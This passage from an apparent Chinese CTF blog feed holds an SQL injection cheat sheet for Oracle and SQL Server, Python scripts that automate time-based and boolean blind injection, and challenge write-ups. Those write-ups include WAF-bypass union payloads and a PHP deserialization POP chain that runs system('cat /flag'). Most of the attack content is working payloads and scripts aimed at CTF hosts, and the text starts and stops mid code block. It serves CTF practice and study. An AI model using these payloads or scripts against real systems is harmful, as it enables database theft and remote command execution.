?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like &#x27;Oracle%))--
?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))--
?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name =&#x27;USERS&#x27;) where limit=3))--
?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1))--</code></pre>
<h3 id="23-盲注">2.3 盲注</h3>
<h4 id="231-布尔盲注">2.3.1 布尔盲注</h4>
<p>既然是盲注，那么肯定涉及到条件判断语句，Oracle除了使用IF the else end if这种复杂的，还可以使用 decode() 函数。<br>
语法：decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值);</p>
<p>该函数的含义如下：</p>
<pre><code class="hljs plaintext">CopyIF 条件=值1 THEN
　　　　RETURN(返回值1)
ELSIF 条件=值2 THEN
　　　　RETURN(返回值2)
　　　　......
ELSIF 条件=值n THEN
　　　　RETURN(返回值n)
ELSE
　　　　RETURN(缺省值)
END IF
Copy?id=1&#x27; and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0,0) from dual)--
?id=1&#x27; and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0,0) from dual)--
?id=1&#x27; and ascii(substr(user,1,1))&gt; 64--  #二分法</code></pre>
<h4 id="232-时间盲注">2.3.2 时间盲注</h4>
<p>可使用DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)函数进行时间盲注，这个函数可以指定延迟的时间</p>
<pre><code class="hljs plaintext">Copy?id=1&#x27; and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) else 1 end)--
?id=1&#x27; and 1=(case when ascii(substr(user,1,1))&gt; 64 then DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) else 1 end)--</code></pre>
<h3 id></h3>
<h2 id="0x03-sql-server-手工注入">0x03 SQL server 手工注入</h2>
<h3 id="31-联合注入">3.1 联合注入</h3>
<pre><code class="hljs plaintext">Copy?id=-1&#x27; union select null,null--
?id=-1&#x27; union select @@servername, @@version--
?id=-1&#x27; union select db_name(),suser_sname()--
?id=-1&#x27; union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null--
?id=-1&#x27; union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--
?id--1&#x27; union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null--
?id=-1&#x27; union select (select top 1 column name from information_schema.columns where table_name=&#x27;users&#x27; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#x27;users&#x27;)),null---
?id=-1&#x27; union select (select top 1 username from users where username not in (select top 3 username from users)),null--</code></pre>
<h3 id="32-报错注入">3.2 报错注入</h3>
<pre><code class="hljs plaintext">Copy?id=1&#x27; and 1=(select 1/@@servername)--
?id=1&#x27; and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--</code></pre>
<h3 id="33-盲注">3.3 盲注</h3>
<h4 id="331-布尔盲注">3.3.1 布尔盲注</h4>
<pre><code class="hljs plaintext">Copy?id=1&#x27; and ascii(substring((select db_ name(1)),1,1))&gt; 64--</code></pre>
<h4 id="332-时间盲注">3.3.2 时间盲注</h4>
<pre><code class="hljs plaintext">Copy?id= 1&#x27;;if(2&gt;1) waitfor delay &#x27;0:0:5&#x27;--
?id= 1&#x27;;if(ASCII(SUBSTRING((select db_name(1)),1,1))&gt; 64) waitfor delay &#x27;0:0:2&#x27;--</code></pre>
<h2 id="0x04-sql注入常用的脚本">0x04 SQL注入常用的脚本</h2>
<h3 id="xff时间盲注二分法">XFF时间盲注二分法</h3>
<pre><code class="hljs plaintext">import requests

url=&quot;http://49.235.141.207:25501/test_sql/sql_ip_insert/&quot;
flag=&#x27;&#x27;
for i in range(1,50):
    f1=flag
    top=127
    low=33
    while low&lt;=top:
        mid=(top+low)//2
        p1=&quot;127.0.0.1&#x27; and (case when ascii(substr((select flag from flag) from &#123;&#125; for 1))&gt;&#123;&#125; then sleep(3) else 0 end) and &#x27;1&quot;.format(str(i),str(mid))
        p2=&quot;127.0.0.1&#x27; and (case when ascii(substr((select flag from flag) from &#123;&#125; for 1))=&#123;&#125; then sleep(3) else 0 end) and &#x27;1&quot;.format(str(i),str(mid))
        headers1=&#123;&#x27;X-Forwarded-For&#x27;:p1&#125;
        headers2=&#123;&#x27;X-Forwarded-For&#x27;:p2&#125;
        try:
            print(i,mid)
            r1=requests.get(url,headers=headers2,timeout=3)
        except requests.exceptions.ReadTimeout as e:
            flag+=chr(mid)
            print(flag)
            break
        except Exception as e:
            pass
        else:
            try:
                r2=requests.get(url,headers=headers1,timeout=3)
            except requests.exceptions.ReadTimeout as e:
                low=mid+1
            except Exception as e:
                pass
            else:
                top=mid-1

    if flag==f1:
        break</code></pre>
<h3 id="二分法时间盲注">二分法时间盲注</h3>
<pre><code class="hljs plaintext">import requests

url=&quot;http://e2237b8f-0ea4-4294-bbe7-007af8f88f8b.node3.buuoj.cn/register.php&quot;
flag=&#x27;&#x27;
proxies=&#123;
    &quot;http&quot;:&quot;127.0.0.1:8080&quot;
&#125;
for i in range(1,50):
    f1=flag
    top=127
    low=33
    # print(1)
    while low&lt;=top:
        mid=(top+low)//2
        p1=&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))&gt;&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;.format(i,mid)
        p2=&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))=&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;.format(i,mid)
        data1=&#123;&#x27;email&#x27;:&#x27;basb@qq.com&#x27;,&#x27;username&#x27;:p1,&#x27;password&#x27;:&#x27;1234&#x27;&#125;
        data2=&#123;&#x27;email&#x27;:&#x27;basb@qq.com&#x27;,&#x27;username&#x27;:p2,&#x27;password&#x27;:&#x27;1234&#x27;&#125;
        try:
            print(i,mid)
            r1=requests.post(url,data=data2,timeout=3,proxies=proxies)
        except requests.exceptions.ReadTimeout as e:
            flag+=chr(mid)
            print(flag)
            break
        except Exception as e:
            pass
        else:
            try:
                r2=requests.post(url,data=data1,timeout=3,proxies=proxies)
            except requests.exceptions.ReadTimeout as e:
                low=mid+1
            except Exception as e:
                pass
            else:
                top=mid-1

    if flag==f1:
        break</code></pre>
<h3 id="二分法盲注">二分法盲注</h3>
<pre><code class="hljs plaintext">import requests

url=&quot;http://116.63.149.36:50048/file_id.php?id=&quot;
flag=&#x27;&#x27;
for i in range(1,50):
   f1=flag
   top=127
   low=33
   while low&lt;=top:
      mid=(top+low)//2
      # data=&#123;&#x27;id&#x27;:&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))&#125;
      # data1=&#123;&#x27;id&#x27;:&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))&#125;
      data=&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))
      data1=&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))
      try:
         r1=requests.post(url+data1)
         print(i,mid)
         if &#x27;glzjin&#x27; in r1.text:
            flag+=chr(mid)
            print(flag)
            break
         r=requests.post(url+data)
         if &quot;Error&quot; in r.text:
            top=mid-1
         if &#x27;glzjin&#x27; in r.text:
            low=mid+1
      except Exception as e:
         pass
   if flag==f1:
      break</code></pre>
<h3 id="时间盲注">时间盲注</h3>
<pre><code class="hljs plaintext">import requests

url = &#x27;http://139.199.182.61/index.php?id=1%27&#x27;
lendata=7
# for i in range(1, 50):
#    try:
#       payload1 = &#x27;/**/and/**/if(length(database())=&#123;&#125;,sleep(3),1)%23&#x27;.format(i)
#       r = requests.get(url + payload1, timeout=3)
#    except requests.exceptions.ReadTimeout as e:
#       lendata = i
#       print(&quot;数据库长度为&quot;+str(i))
#       break

databases=[&#x27;easysql&#x27;]

# database=&quot;&quot;
# for j  in range(1,lendata+1):
#    for k in range(33,127):
#       payload2 = &#x27;/**/and/**/if(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(j, k)
#       print(payload2)
#       try:
#          r=requests.get(url+payload2,timeout=3)
#       except requests.exceptions.ReadTimeout as e:
#          database+=chr(k)
#          print(database)
#          break
#       except Exception as w:
#          pass

# database=&#x27;&#x27;
# databases=[]
# for k in range(0, 10):
#   flag1=len(databases)
#    for i in range(1,50):
#       flag=database
#       for j in range(33,127):
#          payload3=&#x27;/**/and/**/if(ascii(substr((selselectect/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(k , i, j)
#          try:
#             print(payload3)
#             r=requests.get(url+payload3,timeout=3)
#          except requests.exceptions.ReadTimeout as e:
#             database+=chr(j)
#             print(database)
#             break
#          except Exception as w:
#             pass
#       if flag==database:
#          break
#    databases.append(database)
#   if flag1==len(databases):
#      break
# print(databases)


tables=[&#x27;f1aggggggggggggg&#x27;]
# table=&#x27;&#x27;
# # tables=[&#x27;users&#x27;]
# for k in range(0, 10):
#    flag1=len(tables)
#    for i in range(1,50):
#       flag=table
#       for j in range(33,127):
#          payload3=&#x27;/**/and/**/if(ascii(substr((selselectect/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(k , i, j)
#          try:
#             print(payload3)
#             r=requests.get(url+payload3,timeout=3)
#          except requests.exceptions.ReadTimeout as e:
#             table+=chr(j)
#             print(table)
#             break
#          except Exception as w:
#             pass
#       if flag==table:
#          tables.append(table)
#          table=&quot;&quot;
#         break
#    if len(tables)=flag1
#   break
# print(tables)

columns=[&#x27;fl4444444g&#x27;]
# column=&#x27;&#x27;
# for te in tables:
#    for k in range(0,5):
#      flag1=len(columns)
#       for i in range(1,50):
#          flag=column
#          for j in range(33,127):
#             payload4=&#x27;/**/and/**/if(ascii(substr((seselectlect/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&quot;&#123;&#125;&quot; limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(te,k,i,j)
#             try:
#                r=requests.get(url+payload4,timeout=3)
#                print(payload4)
#             except requests.exceptions.ReadTimeout as e:
#                column+=chr(j)
#                print(column)
#                break
#             except Exception as w:
#                pass	
#          if flag==column:
#             columns.append(column)
#             column=&#x27;&#x27;
#             break
#      if len(columns)=flag1:
#         break;
# print(columns)

# data=&#x27;&#x27;

# for db in databases:
#    for ta in tables:
#       for co in columns:
#          for k in range(0,10):
#             for i in range(1,50):
#                flag=data
#                for j in range(33,127):
#                   payload5=&#x27;/**/and/**/if(ascii(substring((seselectlect/**/&#123;&#125;/**/from/**/&#123;&#125;.&#123;&#125;/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(co,db,ta,k,i,j)
#                   try:
#                      r=requests.get(url+payload5,timeout=3)
#                      print(payload5)
#                   except requests.exceptions.ReadTimeout as e:
#                      data+=chr(j)
#                      print(data)
#                      break
#                   except Exception as w:
#                      pass	
#                if flag==data:
#                   data=&#x27;&#x27;
#                   brea</code></pre>
<h3 id="其他">其他</h3>
<pre><code class="hljs plaintext">import requests
s=requests.session()
url=&#x27;https://46a0f98e-cdc3-413d-b67c-b2dbaeb5c4ec.chall.ctf.show/index.php&#x27;
table=&quot;&quot;

for i in range(1,45):
    print(i)
    for j in range(31,128):
        #爆表名  flag
        payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))
        #爆字段名 flag
        #payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))
        #读取flag
        #payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))

        ra = s.get(url=url + &#x27;?id=0/**/or/**/&#x27; + payload).text

        if &#x27;I asked nothing&#x27; in ra:
            table += chr(j)
            print(table)
            break</code></pre>
<pre><code class="hljs plaintext">import requests
url = &quot;http://124.156.121.112:28069/?id=-1&#x27;/**/&quot;
def db(url):                    #爆库名
    for i in range(1,5):
        for j in range(32,128):
            u= &quot;or/**/ascii(substr(database()/**/from/**/&quot;+str(i)+&quot;/**/for/**/1))=&quot;+str(j)+&quot;#&quot;
            s = url+u
            print(s)
            r =  requests.get(s)
            if &#x27;By Rudyard Kipling&#x27; in r.text:
                print(chr(j))
                
def table(url):                    #爆表名
    for i in range(4):
        table_name=&#x27;&#x27;
        for j in range(1,6):
            for k in range(48,128):
                u=id=&quot;||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/&quot;+str(i)+&quot;)/**/from/**/&quot;+str(j)+&quot;/**/for/**/1))=&quot;+str(k)+&quot;#&quot;
                s = url+u
                print(s)
                r =  requests.get(s)            
                if &#x27;By Rudyard Kipling&#x27; in r.text:
                    table_name+=chr(k)
            print(table_name)</code></pre>
<h2 id="参考">参考</h2>
<p><a href="https://blog.csdn.net/qq_45089570/article/details/108932892">sql注入常用脚本_sql脚本注入_西部壮仔的博客-CSDN博客</a></p>
<p><a href="https://mp.weixin.qq.com/s/ZWDXiTN1hglO-T9osvUWnA">微信公众平台 (qq.com)</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2022/02/04/SQL%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p><strong>关于SQL的刷题记录</strong></p>
<h1 id="sql注入">SQL注入</h1>
<span id="more"></span>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/f1ffa70adef3130ddf24b0e19484597f.png?x-oss-process=hzy" alt="image-20220204192950568"></p>
<p>首先查看源码发现name为id，并且是post传参</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a9e5b7fd180fd339add29d1a494e6299.png?x-oss-process=hzy" alt="image-20220204193042721"></p>
<p>用hackbar查查有几个数据，发现只有三个</p>
<p>测试发现当post内容加<code>‘</code>时，内容就显示不出来</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/4e578d6f3c727fa95cfdb3516fef3b71.png?x-oss-process=hzy" alt="image-20220204193404946"></p>
<p>而加<code>’#</code>，发现又正常显示</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a0e1c557c7d6ae4720e5a2a0de721995.png?x-oss-process=hzy" alt="image-20220204193459549"></p>
<p>这个题完全就是考察SQL注入，这个题目前来看有两种解决方法，在这里记录一下。</p>
<h2 id="第一种解决方法">第一种解决方法</h2>
<p>首先先说点知识，1、MySql在5.0版本后新增一个叫<code>information_schema</code>的虚拟数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。利用这个可以获取表名，列名等<br>
2、查询中用到的<code>group_concat()</code>函数是要把查询的内容联合到一起方便查看的，这样就不需要limit 0,1一个一个判断了<br>
先查个字段，因为有三个数据，就用4吧<code>order by 4#</code></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/62cdc02c1da1138cbe7d60e20b964406.png?x-oss-process=hzy" alt="image-20220204193859153"></p>
<p>显示依然正常，那再试试5</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/445c63257452df78a065a1fda32eba15.png?x-oss-process=hzy" alt="image-20220204193934206"></p>
<p>这个时候发现没有返回值，所以可以确定字段就是四个，接下来，爆库名<code>id=-1' union select 1，2，3，4#</code>，把id变为-1是因为如果id有回显的话，我们查询的内容就不能显示了，所以要换一个id没有内容的值</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/3bc76f82edb6870a2ca2d964f10be9ce.png?x-oss-process=hzy" alt="image-20220204194415205"></p>
<p>这样就知道每一个数值所在的位置，然后开始爆库，<code>id=-1' union select 1,database(),user(),version()#</code>,这个有必要说明一下，database（）是查询当前数据库名，user（）是为了查询当前用户名，version（）是为了查询数据库版本</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a2d95a6cab964cfb08e73e4e3ff4e7f5.png?x-oss-process=hzy" alt="image-20220204194828472"></p>
<p>然后爆表名，这个是固定格式，<code>id=-1' union select 1,group_concat(table_name),user(),version() from information_schema.tables where table_schema=database()#</code>,得到两个表名fl4g，sc</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/4667d7a2fd4633e35420005775316a63.png?x-oss-process=hzy" alt="image-20220204200949037"></p>
<p>再然后爆列明，<code>id=-1' union select 1,group_concat(column_name),user(),version() from information_schema.columns where table_name='fl4g'#</code></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a5aa4f619736882f29fe0cf3972067d2.png?x-oss-process=hzy" alt="image-20220204201124534"></p>
<p>得到列名skctf_flag</p>
<blockquote>
<p>表明单引号要用英文的’'，当然不加也可以，但是表名要用十六进制</p>
</blockquote>
<p>最后一步就是查询想要的数据了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a48620af1763c15138bda9d8a06354b7.png?x-oss-process=hzy" alt="image-20220204201353733"></p>
<p>得到flag</p>
<h2 id="第二种解决方法">第二种解决方法</h2>
<p>sqlmap跑，目前还在了解，学会了再更！！</p>
<h1 id="整数型注入">整数型注入</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/d7379c21e5b2e9065425123e62b32895.png?x-oss-process=hzy" alt="image-20220215171031084"></p>
<p>当输入1时发现有回显，并且url也发生变化</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/5072482b3a6aae1cb78915199ddb0f3d.png?x-oss-process=hzy" alt="image-20220215171141632"></p>
<p>使用order by语句查询字段数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/1c3d4a8429e8c5aa49636ff202bfe09f.png?x-oss-process=hzy" alt="image-20220215171256788"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/ae016b3da50d2e14dc650e2bc35defe5.png?x-oss-process=hzy" alt="image-20220215171320208"></p>
<p>当输入3的时候发现没有回显，说明只有俩个字段数据。</p>
<p>使用<a href="https://so.csdn.net/so/search?q=union&amp;spm=1001.2101.3001.7020">union</a>联合查询检测信息回显位置</p>
<pre><code class="hljs javascript">id=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span></code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/572dfa904d048d2b681920aa36232f0b.png?x-oss-process=hzy" alt="image-20220215171433860"></p>
<p>发现并不可以，由于页面只允许返回一行内容，可以修改参数为-1，使得需要查询的数据回显。<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/6646d4d40d422a8f45f417b4646e9bff.png?x-oss-process=hzy" alt="image-20220215171608940"></p>
<p>输入一下来获取当前数据库名</p>
<pre><code class="hljs plaintext">id=-1 union select 1,database()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/ab60b7ccbe913e75ade17050d06b68c4.png?x-oss-process=hzy" alt="image-20220215171752124"></p>
<p>输入一下获取所有数据库名</p>
<pre><code class="hljs plaintext">id=-1 union select 1,group_concat(schema_name)from information_schema.schemata</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/84d84f9386583aed2220619a21378bdf.png?x-oss-process=hzy" alt="image-20220215171840187"></p>
<p>输入一下查询数据库sqli表名</p>
<pre><code class="hljs plaintext">id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/335760043d8e946a7423cadd1e0dec61.png?x-oss-process=hzy" alt="image-20220215171942844"></p>
<p>输入以下获取flag的所有字段名</p>
<pre><code class="hljs plaintext">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27;
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/7e55d70f1fd3fb4b5d4fe6cff9a1d51a.png?x-oss-process=hzy" alt="image-20220215172155435"></p>
<p>输入以下获取指定数据库的表的列的内容</p>
<pre><code class="hljs plaintext">id=-1 union select 1,group_concat(flag) from sqli.flag</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/ba62495591bd481478c051696840c425.png?x-oss-process=hzy" alt="image-20220215172245055"></p>
<p>得到flag！</p>
<h1 id="字符型注入">字符型注入</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/08817b1d06ad9ec837ab7fafcc10344c.png?x-oss-process=hzy" alt="image-20220215172440795"></p>
<p>测试后发现和上边的那个整形注入一样，只有两个数据。回显只有两处：ID和Data。</p>
<p>联合查询</p>
<pre><code class="hljs plaintext">123’ union select database(),2 #</code></pre>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPU--NSS新生賽</title>
    <url>/2022/10/02/SWPU%20NSS%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210231655651.jpeg?x-oss-process=hzy" alt="img"></p>
<span id="more"></span>
<hr>
<h1 id="web">WEB</h1>
<h2 id="funny_web">funny_web</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271101660.png?x-oss-process=hzy" alt="image-20221027110147562"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271102353.png?x-oss-process=hzy" alt="image-20221027110208298"></p>
<p>用户名是NSS</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271102362.png?x-oss-process=hzy" alt="image-20221027110219306"></p>
<p>比赛群管理员qq都试试，然后就登进去了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271103638.png?x-oss-process=hzy" alt="image-20221027110326585"></p>
<p>直接get传参12345a即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271103038.png?x-oss-process=hzy" alt="image-20221027110350979"></p>
<p>NSSCTF{bf02b63e-4021-4a40-905c-d514214f4108}</p>
<h2 id="where_am_i">where_am_i</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271104687.png?x-oss-process=hzy" alt="image-20221027110454583"></p>
<p>社工，找这个图片的地方的联系方式，百度识图</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271106103.png?x-oss-process=hzy" alt="image-20221027110603911"></p>
<p>锦江区的山水间古迹酒店</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271107300.png?x-oss-process=hzy" alt="image-20221027110745248"></p>
<p><strong>028-86112888</strong></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271108930.png?x-oss-process=hzy" alt="image-20221027110814880"></p>
<p>NSSCTF{094b48ac-f4cd-468a-898c-59211144a279}</p>
<h2 id="奇妙的md5">奇妙的MD5</h2>
<p>原题改编</p>
<p><a href="https://blog.csdn.net/m0_52923241/article/details/119669647">(62条消息) 【CTF】关于md5总结_吃_早餐的博客-CSDN博客_ctf md5</a></p>
<h2 id="ez_ez_php">ez_ez_php</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291848041.png?x-oss-process=hzy" alt="image-20220929184814966"></p>
<p>直接文件包含</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291848381.png?x-oss-process=hzy" alt="image-20220929184840317"></p>
<p>得到</p>
<pre><code class="hljs plaintext">6&#x27; &lt;?php
error_reporting(0);
header(&quot;Content-Type:text/html;charset=utf-8&quot;);

echo   &quot;NSSCTF&#123;flag_is_not_here&#125;&quot; .&quot;&lt;br/&gt;&quot;;
echo &quot;real_flag_is_in_ &#x27;/flag&#x27; &quot;.&quot;&lt;br/&gt;&quot;;
echo &quot;换个思路，试试PHP伪协议呢&quot;;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291848725.png?x-oss-process=hzy" alt="image-20220929184859668"></p>
<p>解码得到flag</p>
<p>NSSCTF{332471fd-76b3-4793-b2f6-fb3b5fc59cc6}</p>
<h2 id="ez_sql">ez_sql</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291849677.png?x-oss-process=hzy" alt="image-20220929184951609"></p>
<p>Post传参</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291850659.png?x-oss-process=hzy" alt="image-20220929185000600"></p>
<p>MariaDB注入</p>
<p><a href="https://blog.csdn.net/Zero_Adam/article/details/114031694">SWPU2019]Web1 sql注入 MariaDB注入–无列名注入-group_concat ---- /**/—group by ----- 3.9修改_Zero_Adam的博客-CSDN博客_mariadb注入</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291850516.png?x-oss-process=hzy" alt="image-20220929185023453"></p>
<p>一直到nss=1’/<strong>/group/</strong>/by/**/3,'2</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291850658.png?x-oss-process=hzy" alt="image-20220929185032598"></p>
<p>所以是三行</p>
<pre><code class="hljs plaintext">nss=1&#x27;/**/%26%26/**/updatexml(1,concat(0x7e,(select/**/substr(group_concat(Secr3t),30,20)/**/from/**/NSS_tb),0x7e),1)%23</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271705833.png?x-oss-process=hzy" alt="image-20221027170544656"></p>
<p>报错注入，爆表名</p>
<pre><code class="hljs plaintext">nss=0&#x27;ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()%23</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271709662.png?x-oss-process=hzy" alt="image-20221027170951576"></p>
<p>爆列名</p>
<pre><code class="hljs plaintext">nss=0&#x27;ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=database()%23</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271710330.png?x-oss-process=hzy" alt="image-20221027171056264"></p>
<pre><code class="hljs plaintext">nss=0&#x27;ununionion/**/select/**/1,2,group_concat(Secr3t,flll444g)/**/from/**/NSS_tb%23</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271711733.png?x-oss-process=hzy" alt="image-20221027171140664"></p>
<p>NSSCTF{a60ab5a1-df93-457e-bb58-847111d853b8}</p>
<h2 id="ez_1zpop">ez_1zpop</h2>
<blockquote>
<p>小心被刺</p>
</blockquote>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
class dxg
&#123;
   function fmm()
   &#123;
      return &quot;nonono&quot;;
   &#125;
&#125;

class lt
&#123;
   public $impo=&#x27;hi&#x27;;
   public $md51=&#x27;weclome&#x27;;
   public $md52=&#x27;to NSS&#x27;;
   function __construct()
   &#123;
      $this-&gt;impo = new dxg;
   &#125;
   function __wakeup()
   &#123;
      $this-&gt;impo = new dxg;
      return $this-&gt;impo-&gt;fmm();
   &#125;

   function __toString()
   &#123;
      if (isset($this-&gt;impo) &amp;&amp; md5($this-&gt;md51) == md5($this-&gt;md52) &amp;&amp; $this-&gt;md51 != $this-&gt;md52)
         return $this-&gt;impo-&gt;fmm();
   &#125;
   function __destruct()
   &#123;
      echo $this;
   &#125;
&#125;

class fin
&#123;
   public $a;
   public $url = &#x27;https://www.ctfer.vip&#x27;;
   public $title;
   function fmm()
   &#123;
      $b = $this-&gt;a;
      $b($this-&gt;title);
   &#125;
&#125;

if (isset($_GET[&#x27;NSS&#x27;])) &#123;
   $Data = unserialize($_GET[&#x27;NSS&#x27;]);
&#125; else &#123;
   highlight_file(__file__);
&#125;</code></pre>
<p>pop链条构造</p>
<pre><code class="hljs plaintext">&lt;?php

class lt
&#123;
   public $impo;
   public $md51=&#x27;QNKCDZO&#x27;;
   public $md52=&#x27;240610708&#x27;;
&#125;

class fin
&#123;
   public $a=&#x27;system&#x27;;
   public $title=&#x27;cat /flag&#x27;;

&#125;

$h1 = new lt();
$h2 = new lt();
$fin = new fin();


$h1-&gt;impo=$fin;
